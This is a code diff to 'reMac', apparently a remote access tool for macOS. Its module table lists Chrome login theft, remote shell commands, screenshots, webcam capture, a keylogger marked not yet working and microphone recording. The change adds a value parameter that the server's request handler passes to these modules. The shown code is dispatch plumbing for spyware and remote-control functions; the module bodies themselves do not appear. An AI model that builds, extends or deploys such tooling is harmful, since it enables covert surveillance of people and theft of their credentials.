@@ -22,9 +22,9 @@ reMacModules = {
     'cl': [mod_chrome_logins.mod_chrome_logins(), 'chromelogin', 'Call Chrome-Logins module', 'cl'],
     'sh': [mod_shellcmd.mod_shellcmd(), 'shellcmd', 'Call shell command module', 'sh <cmd to send>'],
     'sc': [mod_screenshot.mod_screenshot(), 'screenshot', 'Call screenshot module', 'sc'],
-    'wc': [mod_webcam.mod_webcam(), 'webcam', 'Call webcam module', 'wc'],
-    'kl': [mod_keylogger.mod_keylogger(), 'keylogger', 'Call keylogger module', 'kl'],
-    'rm': [mod_recmic.mod_recmic(), 'recmic', 'Call record microphone module', 'rm <seconds to record>'],
+    'wc': [mod_webcam.mod_webcam(), 'webcam', 'Call webcam module', 'wc [-t <seconds to warmup>]'],
+    'kl': [mod_keylogger.mod_keylogger(), 'keylogger', 'Call keylogger module (NOT WORKING YET)', 'kl'],
+    'rm': [mod_recmic.mod_recmic(), 'recmic', 'Call record microphone module', 'rm [-t <seconds to record>]'],
     'mh': [mod_modHelp.mod_modHelp(), 'modHelp', 'Call server modules help module', 'mh <module>'],
     'in': [mod_info.mod_info(), 'info', 'Call info module', 'in']
 }
@@ -68,7 +68,7 @@ class reMac_libserver(reMac_libbase):
                 if sent and not self._send_buffer:
                     self.close()
 
-    def processInput(self, input):
+    def processInput(self, input, value = ""):
         if input == "q":  # or input == "quit":
             sys.exit(1)
         elif input == "h":  # or input == "help":
@@ -86,13 +86,14 @@ class reMac_libserver(reMac_libbase):
                 or input == "d":  # or input == "help":
             return reMacModules[input][0].run_mod()
         elif input.startswith("mh"):
-            return reMacModules["mh"][0].print_client_help("reMac", reMacModules, input)
+            return reMacModules["mh"][0].print_client_help("reMac", reMacModules, value)
         else:
             print(f"Command '{input}' NOT FOUND! Check the following command list")
             # print_help()
 
     def _create_response_json_content(self):
         action = self.request.get("action")
+        value = self.request.get("value")
         if action == "hw" \
                 or action == "cb" \
                 or action == "ch" \
@@ -103,7 +104,7 @@ class reMac_libserver(reMac_libbase):
                 or action == "rm" \
                 or action == "in" \
                 or action.startswith("mh"):
-            answer = self.processInput(action)
+            answer = self.processInput(action, value)
             content = {"action": action, "result": answer}
         else:
             content = {"action": action, "result": f'Error: invalid action "{action}".'}
